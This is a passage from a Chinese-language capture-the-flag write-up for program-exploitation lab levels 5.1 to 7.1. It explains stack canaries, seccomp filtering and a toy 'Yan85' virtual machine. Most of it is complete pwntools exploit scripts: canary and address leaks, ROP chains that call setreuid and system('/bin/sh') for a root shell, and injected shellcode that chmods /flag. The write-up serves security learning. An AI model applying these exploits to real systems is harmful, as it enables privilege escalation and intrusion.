class="hljs-string">&quot;binsh_addr&quot;</span>, <span class="hljs-built_in">hex</span>(binsh_addr))<br>rop = ROP(libc)<br>ruid = <span class="hljs-number">0</span>    <span class="hljs-comment"># 其实只需要ruid为0就能够拿到root shell</span><br>euid = <span class="hljs-number">0</span><br><span class="hljs-comment"># rop.raw(rop.ret)</span><br>rop.raw(rop.rdi)<br>rop.raw(ruid)<br>rop.raw(rop.rsi)<br>rop.raw(euid)<br>rop.raw(setreuid_addr)<br>rop.raw(rop.rdi)<br>rop.raw(binsh_addr)<br>rop.raw(sys_addr)<br><span class="hljs-comment"># print(len(rop.chain()))</span><br><br><span class="hljs-comment"># overwrite</span><br>p.recvuntil(<span class="hljs-string">b&quot;Payload size: &quot;</span>)<br>size = <span class="hljs-string">&quot;168&quot;</span><br>p.sendline(size.encode())<br>p.recvuntil(<span class="hljs-string">b&quot;bytes)!\n&quot;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">56</span> + p64(condition) + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span> + p64(canary) + <span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0xdeadbeef</span>) + rop.chain())<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h1 id="level-5-1"><a href="#level-5-1" class="headerlink" title="level 5.1"></a>level 5.1</h1><p><code>canary</code>和5.0不一样，回到了<code>rbp-8</code>处。其次，condition在<code>rbp-0x18</code>处。exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/toddlerone-level-5-1&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><br><span class="hljs-comment"># leak ret_to_main_addr</span><br>p.recvuntil(<span class="hljs-string">b&quot;Payload size: &quot;</span>)<br>size = <span class="hljs-string">&quot;72&quot;</span>                                            <span class="hljs-comment"># ***</span><br>p.sendline(size.encode())<br>p.recvuntil(<span class="hljs-string">b&quot;bytes)!\n&quot;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">66</span> + <span class="hljs-string">b&quot;REPEAT&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;REPEAT&quot;</span>)<br>ret_to_main_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ret_to_main_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(ret_to_main_addr))<br>main_base_addr = ret_to_main_addr - <span class="hljs-number">0x22a7</span>              <span class="hljs-comment"># ***</span><br><br><span class="hljs-comment"># leak canary</span><br>p.recvuntil(<span class="hljs-string">b&quot;Payload size: &quot;</span>)<br>size = <span class="hljs-string">&quot;57&quot;</span><br>p.sendline(size.encode())<br>p.recvuntil(<span class="hljs-string">b&quot;bytes)!\n&quot;</span>)<br><span class="hljs-comment"># pause()</span><br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">51</span> + <span class="hljs-string">b&quot;REPEAT&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;REPEAT&quot;</span>)<br>canary = u64(p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:&quot;</span>, <span class="hljs-built_in">hex</span>(canary))<br><br><span class="hljs-comment"># puts(puts)</span><br>condition = <span class="hljs-number">0x7902619BB2B948FA</span><br>p.recvuntil(<span class="hljs-string">b&quot;Payload size: &quot;</span>)<br>size = <span class="hljs-string">&quot;104&quot;</span><br>p.sendline(size.encode())<br>p.recvuntil(<span class="hljs-string">b&quot;bytes)!\n&quot;</span>)<br>challenge_addr = main_base_addr+<span class="hljs-number">0x1f68</span>          <span class="hljs-comment"># ***</span><br>e = p.elf<br>e.address = main_base_addr<br>r = ROP(e)<br>r.raw(r.rdi) <span class="hljs-comment"># pop rdi; ret</span><br>r.raw(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>r.raw(e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>r.raw(challenge_addr)<br><span class="hljs-comment"># print(len(r.chain()))</span><br>pause()<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + p64(condition) + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span> + p64(canary) + p64(<span class="hljs-number">0xdeadbeef</span>) + r.chain())<br>p.recvuntil(<span class="hljs-string">b&quot;Goodbye!\n&quot;</span>)<br>puts_got_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br>libc_base = puts_got_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_base:&quot;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br><br><span class="hljs-comment"># ROP</span><br>libc.address = libc_base<br>sys_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>setreuid_addr = libc.symbols[<span class="hljs-string">&#x27;setreuid&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setreuid_addr&quot;</span>, <span class="hljs-built_in">hex</span>(setreuid_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;binsh_addr&quot;</span>, <span class="hljs-built_in">hex</span>(binsh_addr))<br>rop = ROP(libc)<br>ruid = <span class="hljs-number">0</span>    <span class="hljs-comment"># 其实只需要ruid为0就能够拿到root shell</span><br>euid = <span class="hljs-number">0</span><br><span class="hljs-comment"># rop.raw(rop.ret)</span><br>rop.raw(rop.rdi)<br>rop.raw(ruid)<br>rop.raw(rop.rsi)<br>rop.raw(euid)<br>rop.raw(setreuid_addr)<br>rop.raw(rop.rdi)<br>rop.raw(binsh_addr)<br>rop.raw(sys_addr)<br><span class="hljs-comment"># print(len(rop.chain()))</span><br><br><span class="hljs-comment"># overwrite</span><br>p.recvuntil(<span class="hljs-string">b&quot;Payload size: &quot;</span>)<br>size = <span class="hljs-string">&quot;136&quot;</span><br>p.sendline(size.encode())<br>p.recvuntil(<span class="hljs-string">b&quot;bytes)!\n&quot;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + p64(condition) + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span> + p64(canary) + p64(<span class="hljs-number">0xdeadbeef</span>) + rop.chain())<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h1 id="level-6-1"><a href="#level-6-1" class="headerlink" title="level 6.1"></a>level 6.1</h1><p>仔细看看这个<strong>seccomp( Secure Computing Mode)</strong>。它是Linux内核提供的一种安全机制，用于限制进程可以执行的系统调用，从而减少潜在的攻击面，提高系统安全性。它最初在Linux 2.6.12引入，并在后续版本中增强了灵活性，使其成为现代沙箱(sanbox)和容器安全的重要组成部分。</p>
<blockquote>
<p>Seccomp的核心思想是<strong>限制进程可以使用的系统调用</strong>。正常情况下，Linux进程可以调用任何可用的系统调用（如<code>execve</code>、<code>open</code>、<code>socket</code>等），但如果程序存在漏洞（如缓冲区溢出），攻击者可能利用这些系统调用执行恶意操作。</p>
<p><strong>Seccomp的两种模式</strong></p>
<ol>
<li>Strict Mode(严格模式)<ul>
<li>仅允许4个基本系统调用：<code>read</code>、<code>write</code>、<code>_exit</code>、<code>sigreturn</code></li>
<li>任何其他系统调用都会导致进程被<code>SIGKILL</code>终止</li>
<li>由于过于严格，实际应用较少</li>
</ul>
</li>
<li>Filter Mode（过滤模式，Seccomp-BPF）<ul>
<li>允许开发者自定义允许或拒绝的系统调用列表</li>
<li>使用**BPF(Berkeley Packet Filter)**规则进行过滤</li>
</ul>
</li>
</ol>
<p><strong>使用示例</strong></p>
<p>使用<code>libseccomp</code>库（或者直接调用<code>prctl</code>&#x2F;<code>seccomp</code>系统调用）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL); <span class="hljs-comment">// 默认禁止所有 syscall</span><br>seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="hljs-number">0</span>); <span class="hljs-comment">// 允许 write</span><br>seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(<span class="hljs-built_in">exit</span>), <span class="hljs-number">0</span>);  <span class="hljs-comment">// 允许 exit</span><br>seccomp_load(ctx); <span class="hljs-comment">// 应用规则</span><br></code></pre></td></tr></table></figure>

<p><code>SCMP_ACT_KILL</code>：默认行为（禁止未明确允许的syscall）</p>
<p><code>SCMP_ACT_ALLOW</code>：允许特定syscall</p>
</blockquote>
<p>查看ida逆出来的源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">v17 = seccomp_init(<span class="hljs-number">0LL</span>);<br><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">1</span>; ++i )<br>&#123;<br>    v6 = v16[i];<br>    v7 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)seccomp_syscall_resolve_num_arch(<span class="hljs-number">0LL</span>, v6);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allowing syscall: %s (number %i)\n&quot;</span>, v7, v6);<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)seccomp_rule_add(v17, <span class="hljs-number">2147418112LL</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v16[i], <span class="hljs-number">0LL</span>) )<br>        __assert_fail(<br>        <span class="hljs-string">&quot;seccomp_rule_add(ctx, SCMP_ACT_ALLOW, syscalls_allowed[i], 0) == 0&quot;</span>,<br>        <span class="hljs-string">&quot;/challenge/toddlerone-level-6-0.c&quot;</span>,<br>        <span class="hljs-number">0x97u</span>,<br>        <span class="hljs-string">&quot;challenge&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)seccomp_load(v17) )<br>    __assert_fail(<span class="hljs-string">&quot;seccomp_load(ctx) == 0&quot;</span>, <span class="hljs-string">&quot;/challenge/toddlerone-level-6-0.c&quot;</span>, <span class="hljs-number">0x9Au</span>, <span class="hljs-string">&quot;challenge&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Goodbye!&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br></code></pre></td></tr></table></figure>

<p>拆解一下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">v17 = seccomp_init(<span class="hljs-number">0LL</span>); <span class="hljs-comment">// 初始化 seccomp 上下文（默认动作：kill）</span><br></code></pre></td></tr></table></figure>

<p><code>seccomp_init(0)</code>创建一个seccomp过滤器上下文，默认行为是<code>SCMP_ACT_KILL</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">1</span>; ++i) &#123;<br>    v6 = v16[i]; <span class="hljs-comment">// 从数组 v16 读取系统调用编号</span><br>    v7 = seccomp_syscall_resolve_num_arch(<span class="hljs-number">0LL</span>, v6); <span class="hljs-comment">// 解析系统调用名称</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allowing syscall: %s (number %i)\n&quot;</span>, v7, v6);<br>    seccomp_rule_add(v17, SCMP_ACT_ALLOW, v16[i], <span class="hljs-number">0</span>); <span class="hljs-comment">// 允许该系统调用</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>循环遍历数组<code>v16</code>（包含两个系统调用编号）。<code>seccmp_rule_add(ctx, SCMP_ACT_ALLOW, syscall_num, 0)</code>允许指定的系统调用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">seccomp_load(v17); <span class="hljs-comment">// 应用 seccomp 规则</span><br></code></pre></td></tr></table></figure>

<p>一旦加载，进程只能允许允许的系统调用，其他调用会被终止。</p>
<p>请注意，Seccomp规则设计为单向严格化，一旦加载，无法放宽或覆盖。在本题中体现在，无法重复调用<code>seccomp_load</code>来修改或增加规则。那么这题就只能通过第一次使用的两个系统调用，其中还有一个系统调用必须为<code>write</code>，因为这样才能泄露基地址构造ROP链。那么获取flag只能通过一个系统调用来进行了。</p>
<p>但是，如果使用<code>puts(puts)</code>来泄露基地址的话，就需要覆盖返回地址来获取libc地址，但是这种情况下只能将两个可用的系统调用分别设置为<code>write</code>和<code>read</code>，一个用来泄露基址，一个用来下次read接收buf输入。这种情况下是无法get shell的。换个思路。</p>
<p>检查一下sec吧：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@practice~program-exploitation~level6-1:/challenge$ checksec ./toddlerone-level-6-1 <br>[*] <span class="hljs-string">&#x27;/challenge/toddlerone-level-6-1&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Full RELRO<br>    Stack:      Canary found<br>    NX:         NX unknown - GNU_STACK missing<br>    PIE:        PIE enabled<br>    Stack:      Executable<br>    RWX:        Has RWX segments<br>    SHSTK:      Enabled<br>    IBT:        Enabled<br></code></pre></td></tr></table></figure>

<p>这里栈上可执行，那么可以泄露栈的地址，在buf中写入shellcode，然后把buf作为返回地址，执行shellcode就行了。那么这里使用chmod系统调用，这样就只需要用到一个系统调用号，我们再通过<code>seccomp_rule_add</code>把chmod的系统调用号放进去即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/toddlerone-level-6-1&quot;</span>)<br><br><span class="hljs-comment"># leak rbp_addr</span><br>p.recvuntil(<span class="hljs-string">b&quot;Payload size: &quot;</span>)<br>size = <span class="hljs-string">&quot;144&quot;</span>                                            <span class="hljs-comment"># ***</span><br>p.sendline(size.encode())<br>p.recvuntil(<span class="hljs-string">b&quot;bytes)!\n&quot;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">138</span> + <span class="hljs-string">b&quot;REPEAT&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;REPEAT&quot;</span>)<br>rbp_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;rbp_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(rbp_addr))<br><br><span class="hljs-comment"># leak canary</span><br>p.recvuntil(<span class="hljs-string">b&quot;Payload size: &quot;</span>)<br>size = <span class="hljs-string">&quot;137&quot;</span><br>p.sendline(size.encode())<br>p.recvuntil(<span class="hljs-string">b&quot;bytes)!\n&quot;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">131</span> + <span class="hljs-string">b&quot;REPEAT&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;REPEAT&quot;</span>)<br>canary = u64(p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:&quot;</span>, <span class="hljs-built_in">hex</span>(canary))<br><br><span class="hljs-comment"># shellcode</span><br>shellcode = shellcraft.pushstr(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br>shellcode += shellcraft.syscall(<span class="hljs-string">&#x27;SYS_chmod&#x27;</span>, <span class="hljs-string">&#x27;rsp&#x27;</span>, <span class="hljs-number">0o777</span>)<br>binary_shellcode = asm(shellcode)<br><span class="hljs-comment"># print(len(binary_shellcode))      # 39</span><br><span class="hljs-comment"># pause()</span><br><br><span class="hljs-comment"># overwrite</span><br>buf_addr = rbp_addr - <span class="hljs-number">0x12b0</span><br>p.recvuntil(<span class="hljs-string">b&quot;Payload size: &quot;</span>)<br>size = <span class="hljs-string">&quot;160&quot;</span><br>p.sendline(size.encode())<br>p.recvuntil(<span class="hljs-string">b&quot;bytes)!\n&quot;</span>)<br>p.send(binary_shellcode + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">89</span> + p32(<span class="hljs-number">1</span>) + p32(<span class="hljs-number">90</span>) + p64(canary) + p64(<span class="hljs-number">0xdeadbeef</span>) + p64(buf_addr))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h1 id="level-7-1"><a href="#level-7-1" class="headerlink" title="level 7.1"></a>level 7.1</h1><p>得用”Yan85”来进行操作。No PIE, no canary and Stack Executable!</p>
<p>好的，详细分析一下”Yan85”，首先是<code>interpreter_loop</code>，在<code>main</code>中调用该函数，并以<code>buf</code>作为参数：<code>interpreter_loop(buf);</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">interpreter_loop</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int8 v1; <span class="hljs-comment">// al</span><br>  __int64 result; <span class="hljs-comment">// rax</span><br><br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    result = *(<span class="hljs-type">unsigned</span> __int8 *)(a1 + <span class="hljs-number">1029</span>);<br>    <span class="hljs-keyword">if</span> ( (_BYTE)result == <span class="hljs-number">0xFF</span> )<br>      <span class="hljs-keyword">break</span>;<br>    v1 = *(_BYTE *)(a1 + <span class="hljs-number">1029</span>);<br>    *(_BYTE *)(a1 + <span class="hljs-number">1029</span>) = v1 + <span class="hljs-number">1</span>;<br>    interpret_instruction(<br>      a1,<br>      *(<span class="hljs-type">unsigned</span> __int16 *)(a1 + <span class="hljs-number">3LL</span> * v1) | ((<span class="hljs-type">unsigned</span> __int64)*(<span class="hljs-type">unsigned</span> __int8 *)(a1 + <span class="hljs-number">3LL</span> * v1 + <span class="hljs-number">2</span>) &lt;&lt; <span class="hljs-number">16</span>));<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>传入的buf是<code>char buf[1024]</code>，因此在<code>interpreter_loop</code>中的<code>a1</code>是buf的起始地址。因此在进入loop后，<code>result</code>是<code>buf[1029]</code>的值。<code>v1</code>也是<code>buf[1029]</code>的值。紧接着<code>buf[1029]++</code>。那么很显然，<code>buf[1029]</code>是控制循环次数的，最大次数为<code>0xFF</code>。<code>buf[1029]</code>也是模拟指针寄存器rip，也就是这里的<code>i</code>。</p>
<p>随后调用<code>interpret_instruction</code>函数，对于传入的参数，第一个参数为buf的起始地址，第二个参数为<code>int_16* buf[3*v1] | ((int_64* buf[3*v1+2])&lt;&lt;16)</code>。</p>
<p>那么，代入数据模拟一下第二个参数到底要做啥：第一次循环，v1为0。那么第二个参数为：<code>(16)buf[0] | (64)((8)buf[2]&lt;&lt;16)</code></p>
<p>也就是说，传入的第二个参数为一个8字节的整数，其中低2字节为<strong>buf[0]和buf[1]</strong>，高6字节为<strong>buf[2]</strong>。</p>
<p>所以每次进入<code>interpret_instruction</code>时，都是三个Byte buf[]的拼接，依次遍历整个buf。进入到<code>interpret_instruction</code>中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">interpret_instruction</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> __int8 *a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br><br>  <span class="hljs-built_in">printf</span>(<br>    <span class="hljs-string">&quot;[V] a:%#hhx b:%#hhx c:%#hhx d:%#hhx s:%#hhx i:%#hhx f:%#hhx\n&quot;</span>,<br>    a1[<span class="hljs-number">1024</span>],<br>    a1[<span class="hljs-number">1025</span>],<br>    a1[<span class="hljs-number">1026</span>],<br>    a1[<span class="hljs-number">1027</span>],<br>    a1[<span class="hljs-number">1028</span>],<br>    a1[<span class="hljs-number">1029</span>],<br>    a1[<span class="hljs-number">1030</span>]);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[I] op:%#hhx arg1:%#hhx arg2:%#hhx\n&quot;</span>, BYTE1(a2), BYTE2(a2), (<span class="hljs-type">unsigned</span> __int8)a2);<br>  <span class="hljs-keyword">if</span> ( (a2 &amp; <span class="hljs-number">0x4000</span>) != <span class="hljs-number">0</span> )<br>    interpret_imm(a1, a2);<br>  <span class="hljs-keyword">if</span> ( (a2 &amp; <span class="hljs-number">0x800</span>) != <span class="hljs-number">0</span> )<br>    interpret_add(a1, a2);<br>  <span class="hljs-keyword">if</span> ( (a2 &amp; <span class="hljs-number">0x200</span>) != <span class="hljs-number">0</span> )<br>    interpret_stk(a1, a2);<br>  <span class="hljs-keyword">if</span> ( (a2 &amp; <span class="hljs-number">0x400</span>) != <span class="hljs-number">0</span> )<br>    interpret_stm(a1, a2);<br>  <span class="hljs-keyword">if</span> ( (a2 &amp; <span class="hljs-number">0x8000</span>) != <span class="hljs-number">0</span> )<br>    interpret_ldm(a1, a2);<br>  <span class="hljs-keyword">if</span> ( (a2 &amp; <span class="hljs-number">0x100</span>) != <span class="hljs-number">0</span> )<br>    interpret_cmp(a1, a2);<br>  <span class="hljs-keyword">if</span> ( (a2 &amp; <span class="hljs-number">0x1000</span>) != <span class="hljs-number">0</span> )<br>    interpret_jmp(a1, a2);<br>  result = BYTE1(a2) &amp; <span class="hljs-number">0x20</span>;<br>  <span class="hljs-keyword">if</span> ( (a2 &amp; <span class="hljs-number">0x2000</span>) != <span class="hljs-number">0</span> )<br>    <span class="hljs-keyword">return</span> interpret_sys(a1, a2);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里模拟寄存器，每个寄存器存储1字节的数据。前面的<code>Reverse</code>模块已经用过这些指令了。那么对于a2来说，<code>buf[x+1]</code>代表的是<code>opcode</code>，低的2字节代表的是两个参数且<code>buf[x+2]</code>是第一个参数，<code>buf[x+0]</code>是第二个参数。</p>
<p><strong>也就是说，一次取buf的三个字节分别为buf[0]，buf[1]，buf[2]情况下，opcode是buf[1]，arg1是buf[0]，arg2是buf[2]。</strong></p>
<p>依次拆解指令，第一个是<code>interpret_imm(a1,a2)</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">_BYTE *__fastcall <span class="hljs-title function_">interpret_imm</span><span class="hljs-params">(_BYTE *a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v2; <span class="hljs-comment">// rax</span><br><br>  v2 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)describe_register(BYTE2(a2));<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[s] IMM %s = %#hhx\n&quot;</span>, v2, (<span class="hljs-type">unsigned</span> __int8)a2);<br>  <span class="hljs-keyword">return</span> write_register(a1, SBYTE2(a2), a2);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里<code>buf[x+1]</code>对应的是寄存器，也就是<code>buf[1024] ~ buf[1030]</code>，<code>buf[x+0]</code>对应的是一个字节的数据。这里不展开<code>describe_register</code>和<code>write_register</code>了，这两个API会统一关于<code>buf[x+1]</code>和模拟寄存器的对应关系。</p>
<p>因此，imm所对应的操作就是将<code>buf[x+0]</code>的值存入<code>buf[x+1]</code>对应的寄存器中。而<code>buf[x+2]</code>就表示opcode，即执行imm指令。</p>
<p><strong>现在，我们需要用这些指令写一个shellcode以获取flag。</strong></p>
